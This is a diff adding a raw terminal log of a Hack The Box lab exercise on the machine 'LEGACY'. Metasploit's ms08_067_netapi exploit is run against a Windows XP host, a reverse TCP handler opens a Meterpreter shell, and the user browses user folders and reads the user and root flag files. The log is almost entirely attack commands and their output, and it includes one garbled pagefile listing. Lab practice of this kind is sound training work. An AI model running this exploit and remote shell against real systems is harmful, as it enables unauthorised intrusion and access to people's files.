@@ -1,1 +1,181 @@
+**********@debian:~$ msfconsole
+Found a database at /home/**********/.msf4/db, checking to see if it is started
+Starting database at /home/**********/.msf4/db...success
+[?] Initial MSF web service account username? [**********]: **********
+[?] Initial MSF web service account password? (Leave blank for random password): **********
+Generating SSL key and certificate for MSF web service
+MSF web service PID file found, but no active process running as PID 1448
+Deleting MSF web service PID file /home/**********/.msf4/msf-ws.pid
+Attempting to start MSF web service...failed
+[!] MSF web service appears to be started, but may not operate as expected.
+MSF web service expects authentication. If you wish to reinitialize the web service account you will need to reinitialize the database.
+Please see /home/**********/.msf4/logs/msf-ws.log for additional details.
+                                                  
 
+         .                                         .
+ .
+
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
+       '   dB'                     BBP
+    dB'dB'dB' dBBP     dBP     dBP BB
+   dB'dB'dB' dBP      dBP     dBP  BB
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB
+
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP                                                                 
+          .                  .                  dB' dBP    dB'.BP       
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP                                                                     
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP                                                                      
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP                                                                       
+                                                                        
+                                                                    .   
+                .                                                       
+        o                  To boldly go where no                        
+                            shell has gone before                       
+                                                                        
+
+       =[ metasploit v5.0.83-dev-                         ]
++ -- --=[ 1991 exploits - 1088 auxiliary - 340 post       ]
++ -- --=[ 560 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: When in a module, use back to go back to the top level prompt
+
+msf5 > use exploit/windows/smb/ms08_067_netapi
+msf5 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
+RHOSTS => 10.10.10.4
+msf5 exploit(windows/smb/ms08_067_netapi) > run
+
+[*] Started reverse TCP handler on 10.10.14.3:4444 
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (180291 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.4:1030) at 2020-04-03 17:06:30 -0400
+
+meterpreter > sysinfo
+Computer        : LEGACY
+OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > pwd
+C:\
+meterpreter > ls
+Listing: C:\
+============
+
+Mode                 Size                Type  Last modified                    Name
+----                 ----                ----  -------------                    ----
+100777/rwxrwxrwx     0                   fil   2017-03-16 01:30:44 -0400        AUTOEXEC.BAT
+100666/rw-rw-rw-     0                   fil   2017-03-16 01:30:44 -0400        CONFIG.SYS
+40777/rwxrwxrwx      0                   dir   2017-03-16 01:20:29 -0400        Documents and Settings
+100444/r--r--r--     0                   fil   2017-03-16 01:30:44 -0400        IO.SYS
+100444/r--r--r--     0                   fil   2017-03-16 01:30:44 -0400        MSDOS.SYS
+100555/r-xr-xr-x     47564               fil   2008-04-13 16:13:04 -0400        NTDETECT.COM
+40555/r-xr-xr-x      0                   dir   2017-03-16 01:20:57 -0400        Program Files
+40777/rwxrwxrwx      0                   dir   2017-03-16 01:20:30 -0400        System Volume Information
+40777/rwxrwxrwx      0                   dir   2017-03-16 01:18:34 -0400        WINDOWS
+100666/rw-rw-rw-     211                 fil   2017-03-16 01:20:02 -0400        boot.ini
+100444/r--r--r--     250048              fil   2008-04-13 18:01:44 -0400        ntldr
+257611620/rw--w----  173947893474951151  fif   5521193617-02-22 00:37:04 -0500  pagefile.sys
+
+meterpreter > cd Documents\ and\ Settings
+meterpreter > ls
+Listing: C:\Documents and Settings
+==================================
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40777/rwxrwxrwx  0     dir   2017-03-16 02:07:20 -0400  Administrator
+40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  All Users
+40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  Default User
+40777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
+40777/rwxrwxrwx  0     dir   2017-03-16 01:32:42 -0400  NetworkService
+40777/rwxrwxrwx  0     dir   2017-03-16 01:33:41 -0400  john
+
+meterpreter > cd john 
+meterpreter > ls
+Listing: C:\Documents and Settings\john
+=======================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Application Data
+40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Cookies
+40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Desktop
+40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Favorites
+40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Local Settings
+40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  My Documents
+100666/rw-rw-rw-  524288  fil   2017-03-16 01:33:41 -0400  NTUSER.DAT
+100666/rw-rw-rw-  1024    fil   2017-03-16 01:33:41 -0400  NTUSER.DAT.LOG
+40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  NetHood
+40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  PrintHood
+40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Recent
+40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  SendTo
+40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Start Menu
+40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Templates
+100666/rw-rw-rw-  178     fil   2017-03-16 01:33:42 -0400  ntuser.ini
+
+meterpreter > cd Desktop 
+meterpreter > ls
+Listing: C:\Documents and Settings\john\Desktop
+===============================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  32    fil   2017-03-16 02:19:32 -0400  user.txt
+
+meterpreter > cat user.txt
+********************************
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > ls
+Listing: C:\Documents and Settings
+==================================
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40777/rwxrwxrwx  0     dir   2017-03-16 02:07:20 -0400  Administrator
+40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  All Users
+40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  Default User
+40777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
+40777/rwxrwxrwx  0     dir   2017-03-16 01:32:42 -0400  NetworkService
+40777/rwxrwxrwx  0     dir   2017-03-16 01:33:41 -0400  john
+
+meterpreter > cd Administrator 
+meterpreter > ls
+Listing: C:\Documents and Settings\Administrator
+================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Application Data
+40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Cookies
+40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Desktop
+40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Favorites
+40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Local Settings
+40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  My Documents
+100666/rw-rw-rw-  524288  fil   2017-03-16 02:07:20 -0400  NTUSER.DAT
+100666/rw-rw-rw-  1024    fil   2017-03-16 02:07:20 -0400  NTUSER.DAT.LOG
+40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  NetHood
+40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  PrintHood
+40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Recent
+40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  SendTo
+40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Start Menu
+40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Templates
+100666/rw-rw-rw-  178     fil   2017-03-16 02:07:21 -0400  ntuser.ini
+
+meterpreter > cd Desktop 
+meterpreter > ls
+Listing: C:\Documents and Settings\Administrator\Desktop
+========================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  32    fil   2017-03-16 02:18:19 -0400  root.txt
+
+meterpreter > cat root.txt
+********************************
